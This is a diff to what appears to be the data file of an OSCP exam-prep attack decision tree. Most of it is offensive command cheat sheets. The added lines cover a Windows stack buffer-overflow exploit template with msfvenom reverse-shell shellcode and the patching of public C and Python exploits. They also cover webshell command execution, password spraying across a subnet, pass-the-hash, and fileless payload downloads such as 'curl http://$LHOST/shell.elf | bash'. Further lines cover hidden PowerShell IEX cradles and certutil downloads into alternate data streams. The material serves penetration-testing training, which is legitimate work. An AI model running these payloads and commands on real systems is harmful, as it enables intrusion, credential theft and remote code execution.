@@ -1555,44 +1555,56 @@ impacket-dpapi backupkeys --export -t domain/admin:'pass'@$IP`,
   bof: {
     phase: "SHELL",
     title: "Buffer Overflow (Windows x86)",
-    body: "PEN-200 BOF methodology: fuzz → offset → EIP control → bad chars → shellcode. Structured process. Don't skip steps.",
-    cmd: `# 1. Fuzz — find crash length
-python3 -c "print('A' * 2000)" | nc $IP <PORT>
+    body: "Stack-based BOF: fixed buffer on stack, input larger than buffer overwrites adjacent memory including the return address. When the function ends, ret pops return address into EIP — control that value, control execution. Flow: (1) large buffer triggers overflow, (2) padding fills to exact offset, (3) return address overwritten with JMP ESP gadget, (4) JMP ESP redirects to ESP which points into shellcode on the stack. ASLR/DEP are out of scope for PEN-200 BOF exercises.",
+    cmd: `# ── FUZZ — find crash length ─────────────────
+python3 -c "print(\'A\' * 2000)" | nc $IP <PORT>
+# Increment by 100 until crash
 
-# 2. Find exact offset
-msf-pattern_create -l 2000
+# ── FIND EXACT OFFSET ────────────────────────
+msf-pattern_create -l 2000 > pattern.txt
+# Send pattern, note EIP value in Immunity Debugger
 msf-pattern_offset -l 2000 -q <EIP_VALUE>
 
-# 3. Confirm EIP control
-python3 -c "print('A'*OFFSET + 'B'*4 + 'C'*(2000-OFFSET-4))"
+# ── CONFIRM EIP CONTROL ──────────────────────
+# Send: padding + BBBB + CCCC... — confirm EIP = 42424242
 
-# 4. Find bad chars — send all bytes 0x01-0xFF
-# Compare in Immunity Debugger vs known good
+# ── BAD CHARS ────────────────────────────────
+# Send \x01-\xFF after EIP, compare memory dump
+# Common: \x00 (null), \x0a (LF), \x0d (CR)
 
-# 5. Find JMP ESP (no ASLR/DEP)
-msf-nasm_shell
-> jmp esp   # → get opcode e.g. FFE4
-# Find in Immunity: !mona jmp -r esp -cpb "\\x00"
+# ── FIND JMP ESP GADGET ──────────────────────
+# In Immunity Debugger:
+!mona jmp -r esp -cpb "\x00"
+# Or with nasm: jmp esp = opcode FFE4
 
-# 6. Generate shellcode
-msfvenom -p windows/shell_reverse_tcp \\
-  LHOST=$LHOST LPORT=$LPORT \\
-  EXITFUNC=thread -b "\\x00" -f py
+# MUST be from a NON-ASLR module inside the vulnerable app
+# View → Executable Modules → confirm no ASLR / SafeSEH
+# Never use ntdll/kernel32 — randomized at every boot
+# If exploit DLL absent on target (e.g. msvbvm60.dll):
+#   check Python version of same exploit for verified addr
+#   or copy DLLs to Kali and search:
+objdump -D target.dll | grep -i "jmp.*esp"
 
-# 7. Final exploit structure
-offset = EXACT_OFFSET
-padding = b"A" * offset
-eip = b"\\xAD\\xDE\\xXX\\xXX"  # JMP ESP address LE
-nop_sled = b"\\x90" * 16
-shellcode = b"PASTE_MSFVENOM_OUTPUT"
-payload = padding + eip + nop_sled + shellcode`,
-    warn: "Always include NOP sled (\\x90 * 16) before shellcode. Account for EXITFUNC=thread to keep service stable.",
+# ── GENERATE SHELLCODE ───────────────────────
+msfvenom -p windows/shell_reverse_tcp \
+  LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread \
+  -f py -e x86/shikata_ga_nai \
+  -b "\x00\x0a\x0d"    # all bad chars here
+
+# ── FINAL EXPLOIT STRUCTURE ──────────────────
+offset   = EXACT_OFFSET
+padding  = b"A" * offset
+eip      = b"\xAA\xBB\xCC\xDD"  # JMP ESP addr — little endian (replace with actual)
+nop_sled = b"\x90" * 16             # NOP slide before shellcode
+buf      = b"PASTE_MSFVENOM_BUF"
+payload  = padding + eip + nop_sled + buf`,
+    warn: "JMP ESP must come from non-ASLR module in the vulnerable app — never ntdll/kernel32 (randomized at boot). NOP sled (\x90 * 16) gives shikata decoder room. EXITFUNC=thread keeps service alive. Rotated EIP (expected 0x10090c83, got 0x9010090c) = off-by-one null byte — C null-terminates strings so memset(buf+size-1, 0x00) shrinks buffer by 1. Fix: increase buffer size by 1.",
     choices: [
       { label: "Exploit worked — got shell", next: "shell_upgrade" },
-      { label: "Shell died immediately — try EXITFUNC=thread", next: "bof" },
+      { label: "Need to fix a public C exploit", next: "exploit_fix_c" },
+      { label: "Shell died — try EXITFUNC=thread", next: "bof" },
     ],
   },
-
   client_side: {
     phase: "SHELL",
     title: "Client-Side Attacks",
@@ -2762,20 +2774,52 @@ enum4linux-ng $IP
     phase: "WEB",
     title: "Web Enumeration",
     body: "Web is open. Hit it from every angle simultaneously — directory fuzz, Nikto, source code review, headers, robots.txt, CMS detection. Information density is everything here.",
-    cmd: `# Directory + file fuzz
+    cmd: `# ── Directory + file fuzz ─────────────────
+# feroxbuster — recursive, fast, good defaults
 feroxbuster -u http://$IP \\
-  -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt \\
-  -x php,html,txt,bak,old,zip --depth 3
+  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
+  -x php,html,txt,bak,old,zip --depth 3 -o scans/ferox.txt
 
-# Nikto
+# ffuf — fine-grained control, filter by size/status/words
+ffuf -u http://$IP/FUZZ \\
+  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
+  -e .php,.html,.txt,.bak,.zip \\
+  -mc 200,301,302,403 \\
+  -o scans/ffuf_dirs.txt
+
+# ffuf — filter false positives by response size
+ffuf -u http://$IP/FUZZ \\
+  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
+  -fs 0            # filter empty responses
+ffuf -u http://$IP/FUZZ \\
+  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
+  -fw 10           # filter by word count — tune to baseline 404
+
+# ffuf — file fuzzing with extensions
+ffuf -u http://$IP/FUZZ \\
+  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \\
+  -mc 200,301,302 -o scans/ffuf_files.txt
+
+# ffuf — POST body fuzzing (login brute)
+ffuf -u http://$IP/login.php \\
+  -X POST \\
+  -d "username=admin&password=FUZZ" \\
+  -w /usr/share/wordlists/rockyou.txt \\
+  -H "Content-Type: application/x-www-form-urlencoded" \\
+  -mc 200 -fs 1234   # tune -fs to failed login response size
+
+# gobuster — fast fallback
+gobuster dir -u http://$IP \\
+  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
+  -x php,html,txt -t 40 -o scans/gobuster.txt
+
+# ── Tech fingerprint ──────────────────────
 nikto -h http://$IP -o scans/nikto.txt
-
-# CMS / tech fingerprint
 whatweb http://$IP
-curl -sv http://$IP | head -50   # headers
+curl -sv http://$IP 2>&1 | grep -i "server\\|x-powered\\|set-cookie\\|location"
 curl http://$IP/robots.txt
 curl http://$IP/sitemap.xml`,
-    warn: null,
+    warn: "ffuf needs false positive filtering or it floods output. Always establish a baseline first — hit a known 404, note the response size, then use -fs to filter it. -fw (word count) and -fc (status code) are your other filters.",
     choices: [
       { label: "Found WordPress", next: "wordpress" },
       { label: "Found login page", next: "login_page" },
@@ -3558,47 +3602,72 @@ nc $IP <admin_port>
 
   exploit_fix_c: {
     phase: "WEB",
-    title: "Fixing C Exploits",
-    body: "C exploits need to be cross-compiled when targeting Windows from Kali. The most common issues: wrong platform headers (winsock2.h), missing linker flags, hardcoded IP/port, bad return address, and off-by-one null byte alignment. Fix each in order — compile after every change.",
-    cmd: `# ── Install cross-compiler ────────────────────────────
+    title: "Fixing C Exploits — Buffer Overflow",
+    body: "Stack-based BOF: user input overflows a fixed buffer and overwrites the return address on the stack. When ret executes, EIP is loaded from the stack — control the return address, control execution. Flow: (1) large buffer triggers overflow, (2) padding fills to correct offset, (3) return address overwritten with JMP ESP gadget, (4) ESP points into shellcode. Fix in order: cross-compile, IP/port, return address, shellcode, off-by-one.",
+    cmd: `# ── Step 0: mirror exploit — never edit originals ────
+searchsploit -m <id>
+
+# ── Step 1: install cross-compiler ───────────────────
 sudo apt install mingw-w64
 
-# ── Compile for 32-bit Windows ────────────────────────
+# ── Step 2: compile for 32-bit Windows ───────────────
 i686-w64-mingw32-gcc exploit.c -o exploit.exe
 
-# ── Common compile errors + fixes ─────────────────────
 # Error: undefined reference to WSAStartup / socket / connect
-# Fix: add winsock linker flag
+# Fix: link winsock library
 i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
 
 # Error: undefined reference to pthread / ssl
-# Fix: add the relevant lib
 i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32 -lpthread
 
-# ── 64-bit Windows ────────────────────────────────────
+# 64-bit target:
 x86_64-w64-mingw32-gcc exploit.c -o exploit64.exe -lws2_32
 
-# ── Fix hardcoded IP and port ──────────────────────────
-# grep for the socket setup block:
-grep -n "inet_addr\|sin_port\|htons" exploit.c
-# Change inet_addr("x.x.x.x") → inet_addr("$IP")
-# Change htons(80) → htons(<target_port>)
+# ── Step 3: fix hardcoded IP and port ────────────────
+grep -n "inet_addr\\|sin_port\\|htons" exploit.c
+# inet_addr("x.x.x.x")  →  inet_addr("$IP")   // converts IP string to network addr
+# htons(80)              →  htons(<port>)       // converts port to network byte order
 
-# ── Replace unknown hex shellcode with your own ────────
-# Generate clean payload (match arch — x86 or x64):
-msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\\x00\\x0a\\x0d" 
-# Paste output into shellcode[] array, keep NOP sled above it
+# ── Step 4: return address ────────────────────────────
+# Must point to a JMP ESP gadget so ret redirects into shellcode on stack.
+#
+# ASLR: system DLLs (ntdll, kernel32) randomize at every boot — never use them.
+# Use non-ASLR modules inside the vulnerable application only.
+#
+# Check in Immunity Debugger: View → Executable Modules
+# Confirm target module has no ASLR / SafeSEH
+#
+# If exploit DLL is absent on target (e.g. msvbvm60.dll):
+#   → Check Python version of same exploit for a verified working address
+#   → Clone target environment in VM, attach debugger, find JMP ESP manually
+#   → Or copy target DLLs to Kali and search with objdump:
+objdump -D target.dll | grep -i "jmp.*esp"
+#
+# Update return address in C code:
+unsigned char retn[] = "\\x83\\x0c\\x09\\x10"; // JMP ESP @ 0x10090c83
 
-# ── Off-by-one null byte fix ──────────────────────────
-# If EIP is overwritten but misaligned by 1 byte:
-# Look for: memset(padding + initial_buffer_size - 1, 0x00, 1)
-# This null-terminates the string — strcat sees 779 bytes not 780
+# ── Step 5: replace shellcode ─────────────────────────
+# Public exploits contain obfuscated hex payloads — always replace.
+# Bad chars are usually listed in the exploit comments.
+msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\\x00\\x0a\\x0d\\x25\\x26\\x2b\\x3d"
+# Paste buf[] into shellcode[] array, keep NOP sled (\\x90 * 16) before payload
+
+# ── Step 6: off-by-one null byte fix ──────────────────
+# Symptom: EIP is overwritten but bytes are rotated by one
+#   Expected: 0x10090c83  →  Got: 0x9010090c
+#
+# Cause: C strings are null-terminated. This memset call sets
+# the last byte of padding to 0x00:
+#   memset(padding + initial_buffer_size - 1, 0x00, 1);
+# So strcat sees a 779-byte string instead of 780 — offset shifts by 1.
+#
 # Fix: increase initial_buffer_size by 1
 int initial_buffer_size = 781;  // was 780
 
-# ── Run Windows binary from Kali ──────────────────────
+# ── Step 7: run Windows binary from Kali ─────────────
+# wine = compatibility layer for running Windows PE on Linux
 sudo wine exploit.exe`,
-    warn: "Never modify exploits in /usr/share/exploitdb/ — they get overwritten on update. Always searchsploit -m first. If the return address comes from a DLL not in the target app, find a new one from a non-ASLR module in the vulnerable binary itself.",
+    warn: "Never edit in /usr/share/exploitdb/ — searchsploit -m first. JMP ESP must come from a non-ASLR module in the vulnerable app itself. If the DLL in the exploit isn\'t loaded on your target (View → Executable Modules in Immunity), it will crash not shell. Rotated EIP = off-by-one null byte — increase buffer size by 1.",
     choices: [
       { label: "Compiled and working — got shell", next: "shell_upgrade" },
       { label: "Back to exploit search", next: "searchsploit_web" },
@@ -3608,46 +3677,68 @@ sudo wine exploit.exe`,
   exploit_fix_web: {
     phase: "WEB",
     title: "Fixing Web / Python Exploits",
-    body: "Web exploits are easier to fix than C — no compilation, no arch issues. The work is reading the code and matching it to your target. Five things to check in order: URL/base_url, protocol (HTTP vs HTTPS), credentials, CSRF token param name, SSL verification.",
-    cmd: `# ── Checklist before running any web exploit ──────────
-# 1. base_url / target IP
-grep -n "base_url\|http\|url\|host\|ip" exploit.py | head -20
+    body: "Web exploits don't need cross-compilation — the work is reading the code and matching it to your target. Six questions to ask: (1) HTTP or HTTPS? (2) Correct URL path/route? (3) Pre-auth or post-auth? (4) If post-auth — credentials correct? (5) CSRF token param name match? (6) WAF or self-signed cert disrupting it? Answer all six before running.",
+    cmd: `# ── pyfix — auto-convert py2 exploits (vajra) ────────
+# Run this first if the exploit is Python 2
+pyfix exploit.py --dry-run    # audit diff before writing
+pyfix exploit.py              # convert → exploit_py3.py
+pyfix exploit.py --add-verify # also injects requests verify=False
 
-# 2. HTTP vs HTTPS — if target uses HTTPS, update the url AND
-#    add verify=False to every requests.get/post call:
-#    requests.post(url, data=data, verify=False)
-#    requests.get(url, verify=False)
+# Then work from the converted file:
+python3 exploit_py3.py
 
-# 3. Credentials — find and replace:
-grep -n "username\|password\|user\|pass\|admin" exploit.py
+# ── # ── Step 1: base_url / target IP ────────────────────
+grep -n "base_url\\|http\\|url\\|host\\|ip" exploit.py | head -20
+# Update IP and path:
+base_url = "https://$IP/admin"   // match protocol AND path exactly
 
-# 4. CSRF token param name mismatch — common silent failure:
-#    Add a print statement before the split to see what the server returns:
-#    print("[+] Location header: " + response.headers['Location'])
-#    If the param name doesn't match csrf_param → update it:
-#    csrf_param = "_sk_"   # change to whatever the server sends
+# ── Step 2: HTTP vs HTTPS — SSL verification ──────────
+# Self-signed cert will break exploit unless you add verify=False
+# Add to every requests.get/post call:
+requests.post(url, data=data, verify=False)
+requests.get(url, verify=False)
 
-# 5. URL path — check if app is installed at /cms, /admin, /app, etc:
-grep -n "path\|route\|upload\|login" exploit.py | head -20
+# Suppress urllib3 InsecureRequestWarning at top of script:
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# ── Python 2 → Python 3 common fixes ──────────────────
+# ── Step 3: credentials ───────────────────────────────
+grep -n "username\\|password\\|user\\|pass\\|admin" exploit.py
+# Update to match discovered creds
+
+# ── Step 4: CSRF / token param name mismatch ─────────
+# Most common silent failure after auth succeeds.
+# Symptom: IndexError: list index out of range on a .split() call
+#
+# The exploit expects one token param name, server sends another.
+# Debug: add a print before the failing split:
+print("[+] Location header: " + response.headers['Location'])
+# Example output: https://$IP/admin?_sk_=f2946ad9afceb247864
+# Exploit had:  csrf_param = "__c"
+# Server sends: _sk_
+# Fix:
+csrf_param = "_sk_"   // match whatever the server actually sends
+
+# ── Step 5: URL path — app install location ───────────
+grep -n "path\\|route\\|upload\\|login" exploit.py | head -20
+# App may be at /cmsms, /app, /cms, /admin — not always root
+
+# ── Step 6: Python 2 → Python 3 fixes ────────────────
 # print "x"        → print("x")
 # urllib.quote()   → urllib.parse.quote()
 # raw_input()      → input()
 # basestring       → str
-# .has_key()       → in dict
+# .has_key(k)      → k in dict
 
 # ── Debug a crash mid-exploit ─────────────────────────
-# Run with python3 -u for unbuffered output
-python3 -u exploit.py
-# Add print statements above the failing line to inspect variables
-# Read the full traceback — the line number and function name are exact
+python3 -u exploit.py   // unbuffered — prints as it runs
+# Read the full traceback — line number and function are exact
+# Add print() before any failing line to inspect variables
 
-# ── SSL self-signed cert warning ──────────────────────
-# Suppress urllib3 InsecureRequestWarning:
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)`,
-    warn: "If the exploit authenticates and then fails — the most common cause is a CSRF/token parameter name mismatch. Print the redirect Location header to see what the server actually sends. Don't assume the exploit author's variable names match your target's response.",
+# ── Validate webshell after exploit ───────────────────
+curl -k https://$IP/uploads/shell.php?cmd=whoami
+curl -k "https://$IP/shell.php?cmd=id;hostname;ip+a"`,
+    warn: "CSRF token param name mismatch is the #1 silent failure after auth succeeds — print the Location header to see what the server sends, don\'t trust the exploit author\'s variable name. WAFs and .htaccess rules are out of scope for exploit authors — if a request gets blocked, check response codes and add headers manually. Verify=False is required for any self-signed cert target.",
     choices: [
       { label: "Fixed and working — got shell", next: "shell_upgrade" },
       { label: "Got webshell — need reverse shell", next: "reverse_shell" },
@@ -3655,9 +3746,6 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)`,
     ],
   },
 
-  // ══════════════════════════════════════════
-  //  SMB
-  // ══════════════════════════════════════════
   smb_enum: {
     phase: "SMB",
     title: "SMB Enumeration",
@@ -4239,10 +4327,13 @@ find / -name local.txt 2>/dev/null | xargs cat`,
     phase: "LINUX",
     title: "LinPEAS",
     body: "Transfer and run. Tee to a file so you can grep it later. Prioritize RED findings first, then YELLOW. Don't just read — grep for keywords.",
-    cmd: `# Transfer
+    cmd: `# Transfer — try in order until one works
 python3 -m http.server 80   # on attacker
 
-wget http://$LHOST/linpeas.sh -O /tmp/lp.sh
+wget http://$LHOST/linpeas.sh -O /tmp/lp.sh            # preferred
+wget -q --no-check-certificate https://$LHOST/linpeas.sh -O /tmp/lp.sh  # SSL fallback
+curl http://$LHOST/linpeas.sh -o /tmp/lp.sh            # if wget missing
+curl -k https://$LHOST/linpeas.sh -o /tmp/lp.sh        # curl SSL fallback
 chmod +x /tmp/lp.sh
 /tmp/lp.sh | tee /tmp/lp_out.txt
 
@@ -4251,6 +4342,7 @@ grep -i "sudo\\|suid\\|cron\\|writable\\|password\\|key\\|token" /tmp/lp_out.txt
 
 # Also run pspy for process monitoring
 wget http://$LHOST/pspy64 -O /tmp/pspy
+curl http://$LHOST/pspy64 -o /tmp/pspy   # fallback
 chmod +x /tmp/pspy && /tmp/pspy`,
     warn: null,
     choices: [
@@ -4621,27 +4713,33 @@ dir /s /b C:\\*.config 2>nul`,
   pth: {
     phase: "WINDOWS",
     title: "Pass the Hash",
-    body: "NTLM hashes authenticate without cracking. evil-winrm, psexec, wmiexec — all work with hashes directly.",
-    cmd: `# evil-winrm (WinRM — port 5985/5986)
+    body: "NTLM hashes authenticate without cracking. evil-winrm, psexec, wmiexec — all work with hashes directly. nxc/cme confirm which services accept the hash before you connect.",
+    cmd: `# ── Verify hash works first ──────────────
+nxc smb $IP -u administrator -H <NTLM_HASH>
+nxc winrm $IP -u administrator -H <NTLM_HASH>
+# (Pwn3d!) = local admin confirmed
+
+# ── Connect ───────────────────────────────
+# evil-winrm (WinRM 5985/5986)
 evil-winrm -i $IP -u administrator -H <NTLM_HASH>
 
-# impacket-psexec
+# impacket-psexec — drops binary, noisier
 impacket-psexec domain/administrator@$IP -hashes :NTLM_HASH
 
-# impacket-wmiexec (stealthier)
+# impacket-wmiexec — stealthier, no binary drop
 impacket-wmiexec domain/administrator@$IP -hashes :NTLM_HASH
 
 # impacket-smbexec
 impacket-smbexec domain/administrator@$IP -hashes :NTLM_HASH
 
-# CME verification
-crackmapexec smb $IP -u administrator -H <NTLM_HASH>
-crackmapexec winrm $IP -u administrator -H <NTLM_HASH>`,
-    warn: null,
+# ── Spray hash across subnet ──────────────
+nxc smb $SUBNET/24 -u administrator -H <NTLM_HASH> --continue-on-success`,
+    warn: "nxc (netexec) is the maintained CME successor — same syntax. Use it to confirm (Pwn3d!) before connecting. wmiexec is stealthier than psexec — no binary written to disk.",
     choices: [
       { label: "Got admin shell!", next: "got_root_windows" },
     ],
   },
+
 
   windows_manual_enum: {
     phase: "WINDOWS",
@@ -4851,19 +4949,32 @@ type C:\\Users\\Administrator\\Desktop\\proof.txt
     cmd: `# Add DC to hosts
 echo "$IP dc01.domain.com domain.com" >> /etc/hosts
 
-# Verify connectivity
-crackmapexec smb $IP -u user -p 'pass'
+# ── Verify connectivity ───────────────────────
+# nxc (netexec) — CME successor, same syntax, actively maintained
+nxc smb $IP -u user -p 'pass'
+crackmapexec smb $IP -u user -p 'pass'   # fallback if nxc not installed
 
-# Initial domain recon
-crackmapexec smb $IP -u user -p 'pass' --users
-crackmapexec smb $IP -u user -p 'pass' --groups
-crackmapexec smb $IP -u user -p 'pass' --shares
-crackmapexec smb $IP -u user -p 'pass' --pass-pol   # check lockout policy!
+# ── Initial domain recon ──────────────────────
+nxc smb $IP -u user -p 'pass' --users
+nxc smb $IP -u user -p 'pass' --groups
+nxc smb $IP -u user -p 'pass' --shares
+nxc smb $IP -u user -p 'pass' --pass-pol   # CHECK LOCKOUT BEFORE SPRAYING
 
-# LDAP enum
-ldapsearch -x -h $IP -D "user@domain.com" -w 'pass' \\
+# ── ldapdomaindump — fast HTML/JSON AD dump ───
+# Outputs users, groups, computers as HTML + JSON
+ldapdomaindump -u 'domain\\user' -p 'pass' $IP -o /tmp/ldd/
+# Open domain_users.html and domain_groups.html for quick visual map
+
+# ── windapsearch — LDAP enum without domain join ──
+windapsearch --dc-ip $IP -d domain.com -u user@domain.com -p 'pass' -m users
+windapsearch --dc-ip $IP -d domain.com -u user@domain.com -p 'pass' -m groups
+windapsearch --dc-ip $IP -d domain.com -u user@domain.com -p 'pass' -m computers
+windapsearch --dc-ip $IP -d domain.com -u user@domain.com -p 'pass' -m privileged-users
+
+# ── ldapsearch — raw fallback ─────────────────
+ldapsearch -x -h $IP -D "user@domain.com" -w 'pass' \
   -b "dc=domain,dc=com" "(objectClass=user)" | grep sAMAccountName`,
-    warn: "Check the password policy BEFORE any spraying. Lockouts during the exam are catastrophic.",
+    warn: "Check password policy BEFORE any spraying — nxc smb --pass-pol. Lockouts on the exam are catastrophic. ldapdomaindump HTML output is the fastest way to visually map the domain before BloodHound finishes. nxc is the maintained fork of crackmapexec — prefer it where installed.",
     choices: [
       { label: "Run BloodHound (mandatory)", next: "bloodhound" },
       { label: "Run Responder first (passive hash capture)", next: "responder" },
@@ -4872,6 +4983,7 @@ ldapsearch -x -h $IP -D "user@domain.com" -w 'pass' \\
       { label: "Password spray (carefully)", next: "ad_spray" },
     ],
   },
+
 
   bloodhound: {
     phase: "AD",
@@ -4967,27 +5079,34 @@ hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule`,
     phase: "AD",
     title: "Password Spraying",
     body: "One password across all users. Seasonal passwords, company name variants, default creds. One attempt per account per window to avoid lockout.",
-    cmd: `# CHECK POLICY FIRST
-crackmapexec smb $IP -u user -p 'pass' --pass-pol
+    cmd: `# CHECK POLICY FIRST — before any spraying
+nxc smb $IP -u user -p 'pass' --pass-pol
+crackmapexec smb $IP -u user -p 'pass' --pass-pol   # fallback
 
-# Spray with CME
-crackmapexec smb $IP -u users.txt -p 'Password123!' --continue-on-success
-crackmapexec smb $IP -u users.txt -p 'Winter2024!' --continue-on-success
+# Spray with nxc (netexec) — preferred, CME successor
+nxc smb $IP -u users.txt -p 'Password123!' --continue-on-success
+nxc smb $IP -u users.txt -p 'Winter2025!' --continue-on-success
 
-# Kerbrute spray (faster, less noisy)
-./kerbrute_linux_amd64 passwordspray \\
-  -d domain.com --dc $IP \\
+# Also spray other services simultaneously
+nxc winrm $IP -u users.txt -p 'Password123!'
+nxc rdp   $IP -u users.txt -p 'Password123!'
+nxc ssh   $IP -u users.txt -p 'Password123!'
+
+# Kerbrute spray — faster, fewer logon events than LDAP
+./kerbrute_linux_amd64 passwordspray \
+  -d domain.com --dc $IP \
   users.txt 'Password123!'
 
 # Common spray passwords:
 # Password1!   Welcome1!   Summer2024!
 # Winter2025!  Company123! <CompanyName>1!`,
-    warn: "One spray attempt per lockout window. Locking accounts = exam failure.",
+    warn: "One spray attempt per lockout window — locking accounts is exam failure. nxc (netexec) is the maintained fork of crackmapexec with identical syntax. Spray SMB, WinRM, and RDP in the same pass.",
     choices: [
       { label: "Spray hit — got new creds", next: "creds_found" },
       { label: "Nothing — AS-REP roast or Kerberoast", next: "asrep_roast" },
     ],
   },
+
 
   acl_abuse: {
     phase: "AD",
@@ -5140,6 +5259,9 @@ type C:\\Users\\Administrator\\Desktop\\proof.txt
 sudo openvpn ~/oscp.ovpn &
 ping 10.10.10.1   # confirm routing
 
+# File descriptor limit — required for rustscan full port scans
+ulimit -n 5000
+
 # Kali updated, tools present
 which nmap gobuster feroxbuster ligolo-ng evil-winrm impacket-secretsdump
 
@@ -5268,9 +5390,20 @@ impacket-smbserver share . -smb2support
 impacket-smbserver share /path/to/tools -smb2support -username user -password pass
 
 # ── LINUX: DOWNLOAD TO TARGET ─────────────
-wget http://$LHOST/linpeas.sh -O /tmp/lp.sh
+# wget — most common on Linux targets
+wget http://$LHOST/linpeas.sh -O /tmp/lp.sh          # rename output
+wget -q http://$LHOST/shell.elf -O /tmp/s             # quiet, short name
+wget --no-check-certificate https://$LHOST/shell.elf -O /tmp/s  # ignore SSL
+wget -c http://$LHOST/bigfile.tar.gz -O /tmp/f.tgz   # resume interrupted
+wget -b http://$LHOST/linpeas.sh -O /tmp/lp.sh        # background download
+wget --user=user --password=pass http://$LHOST/file   # authenticated
+# POST request via wget
+wget --post-data="cmd=id" http://$IP/exec.php -O -
+
+# curl — fallback if wget missing
 curl http://$LHOST/linpeas.sh -o /tmp/lp.sh
-curl http://$LHOST/shell.elf | bash   # fileless
+curl -k https://$LHOST/shell.elf -o /tmp/s            # ignore SSL
+curl http://$LHOST/shell.elf | bash                   # fileless — never touches disk
 
 # nc transfer (no HTTP available)
 # Attacker: nc -nlvp 4444 < file.sh
@@ -5284,8 +5417,36 @@ curl http://$LHOST/shell.elf | bash   # fileless
 scp linpeas.sh user@$IP:/tmp/lp.sh
 
 # ── WINDOWS: DOWNLOAD TO TARGET ──────────
-# certutil (built-in, often allowed)
-certutil -urlcache -split -f http://$LHOST/shell.exe C:\Windows\Temp\shell.exe
+# ── certutil (LOLBin — built-in, hard to block) ──
+# T1105: Ingress Tool Transfer
+# Paths: C:\Windows\System32\certutil.exe
+#        C:\Windows\SysWOW64\certutil.exe
+
+# Standard download — saves to current folder
+certutil.exe -urlcache -f http://$LHOST/shell.exe shell.exe
+
+# -split avoids caching (cleaner, less artifacts)
+certutil.exe -urlcache -split -f http://$LHOST/shell.exe C:\Windows\Temp\shell.exe
+
+# verifyctl — alternate download method, same result
+certutil.exe -verifyctl -f http://$LHOST/shell.exe shell.exe
+
+# Save to Alternate Data Stream (ADS) — hides from dir listing
+# T1564.004: NTFS File Attributes
+certutil.exe -urlcache -f http://$LHOST/shell.ps1 C:\Windows\Temp\legit.txt:hidden
+
+# ── certutil encode/decode (T1027.013 / T1140) ───
+# Encode a file to base64 — useful for exfil or transfer
+certutil -encode C:\Windows\Temp\shell.exe shell.b64
+
+# Decode base64 back to binary
+certutil -decode shell.b64 C:\Windows\Temp\shell.exe
+
+# Decode hex-encoded file
+certutil -decodehex shell.hex C:\Windows\Temp\shell.exe
+
+# Verify transfer integrity
+certutil -hashfile C:\Windows\Temp\shell.exe MD5
 
 # PowerShell DownloadFile
 powershell -c "(New-Object Net.WebClient).DownloadFile('http://$LHOST/shell.exe','C:\Windows\Temp\shell.exe')"
@@ -5304,6 +5465,13 @@ Copy-Item \\$LHOST\share\shell.exe C:\Windows\Temp\shell.exe
 # curl (Windows 10+)
 curl http://$LHOST/shell.exe -o C:\Windows\Temp\shell.exe
 
+# wget (Windows 10+ — PowerShell alias for Invoke-WebRequest)
+wget http://$LHOST/shell.exe -OutFile C:\Windows\Temp\shell.exe
+# or explicitly:
+powershell -c "wget http://$LHOST/shell.exe -OutFile C:\Windows\Temp\shell.exe"
+# ignore SSL:
+powershell -c "wget https://$LHOST/shell.exe -OutFile C:\Windows\Temp\shell.exe -SkipCertificateCheck"
+
 # ── WINDOWS: EXECUTE IN MEMORY ────────────
 # PS DownloadString — never touches disk
 powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/Invoke-PowerShellTcp.ps1')"
@@ -5318,7 +5486,7 @@ powershell -nop -w hidden -enc [OUTPUT]
 md5sum /tmp/file.sh
 # Windows
 certutil -hashfile C:\Windows\Temp\shell.exe MD5`,
-    warn: "impacket-smbserver is the most reliable Windows transfer when HTTP is blocked. Modern Windows requires SMB2 — always add -smb2support. If Defender blocks the download, use the in-memory DownloadString cradle — it never writes to disk.",
+    warn: "impacket-smbserver is the most reliable Windows transfer when HTTP is blocked. Modern Windows requires SMB2 — always add -smb2support. If Defender blocks the download, use the in-memory DownloadString cradle — it never writes to disk. certutil is heavily signatured — Sigma, Elastic, and Splunk all have rules on it. If AV is active, use PowerShell cradle or SMB instead. IOC: certutil useragent strings are 'Microsoft-CryptoAPI/10.0' and 'CertUtil URL Agent' — both are logged.",
     choices: [
       { label: "Tools transferred — Linux privesc", next: "linpeas" },
       { label: "Tools transferred — Windows privesc", next: "winpeas" },
@@ -5340,34 +5508,26 @@ export USER=founduser
 export PASS='foundpassword'
 export HASH='aad3b435b51404eeaad3b435b51404ee:NTLMHASH'
 
-# ── CRACKMAPEXEC — SPRAY ALL SERVICES ────
-# SMB
+# ── NXC (NETEXEC) — SPRAY ALL SERVICES ──
+# nxc = netexec, maintained successor to crackmapexec (same syntax)
+nxc smb   $IP -u $USER -p $PASS
+nxc smb   $IP -u $USER -H $HASH   # Pass-the-Hash
+nxc winrm $IP -u $USER -p $PASS
+nxc ssh   $IP -u $USER -p $PASS
+nxc rdp   $IP -u $USER -p $PASS
+nxc ftp   $IP -u $USER -p $PASS
+nxc mssql $IP -u $USER -p $PASS
+
+# Spray across subnet
+nxc smb $SUBNET/24 -u $USER -p $PASS --continue-on-success
+nxc smb $SUBNET/24 -u $USER -H $HASH --continue-on-success
+
+# crackmapexec fallback (identical syntax)
 crackmapexec smb $IP -u $USER -p $PASS
-crackmapexec smb $IP -u $USER -H $HASH   # PtH
 
-# WinRM
-crackmapexec winrm $IP -u $USER -p $PASS
-
-# SSH
-crackmapexec ssh $IP -u $USER -p $PASS
-
-# RDP
-crackmapexec rdp $IP -u $USER -p $PASS
